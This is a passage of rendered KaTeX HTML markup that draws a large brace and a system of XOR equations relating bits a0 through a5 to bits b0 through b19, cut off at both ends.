delim-size4"><span>⎪</span></span></span><span style="top:10.100009999999982em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.80000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.50000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:9.20000999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.900009999999979em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.600009999999978em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.300009999999977em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:8.000009999999977em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.700009999999976em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.400009999999975em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:7.100009999999974em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.800009999999974em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.500009999999973em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:6.200009999999972em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.9000099999999716em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.600009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.30000999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:5.000009999999969em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.7000099999999705em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.40000999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:4.100009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.8000099999999706em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.5000099999999708em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:3.200009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.900009999999971em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.6000099999999713em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.3000099999999715em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:2.0000099999999716em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.7000099999999718em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.400009999999972em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:1.1000099999999722em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.8000099999999724em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.5000099999999725em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:0.2000099999999727em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.09999000000002711em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.39999000000002694em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.6999900000000268em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-0.9999900000000266em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.2999900000000266em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.5999900000000267em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.8999900000000267em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.1999900000000268em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.150010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.300010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.600010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.900010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.200010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.500010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.800010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.100010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.400010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-6.700010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.000010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.300010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.600010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-7.900010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.200010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.500010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-8.800010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.100010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.400010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-9.700010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.000010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.300010000000023em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.600010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-10.900010000000023em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.200010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.500010000000024em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-11.800010000000025em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.100010000000026em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.400010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-12.700010000000027em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.000010000000028em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.300010000000029em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.60001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-13.90001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.20001000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.500010000000032em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-14.800010000000032em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.100010000000033em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.400010000000034em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-15.700010000000034em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.000010000000035em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.300010000000036em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.600010000000037em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-16.900010000000037em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.200010000000038em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.50001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-17.80001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.10001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.40001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-18.70001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.000010000000042em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.30001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.60001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-19.90001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.20001000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.500010000000042em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-20.800010000000043em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.100010000000044em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.400010000000044em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-21.700010000000045em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.000010000000046em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.300010000000047em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.600010000000047em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-22.900010000000048em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.20001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.50001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-23.80001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.10001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.40001000000005em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-24.700010000000052em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-25.000010000000053em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-25.300020000000053em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:22.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:23.29000000000002em;"><span style="top:-25.290000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-23.850000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-22.410000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-20.970000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-19.530000000000015em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-18.090000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 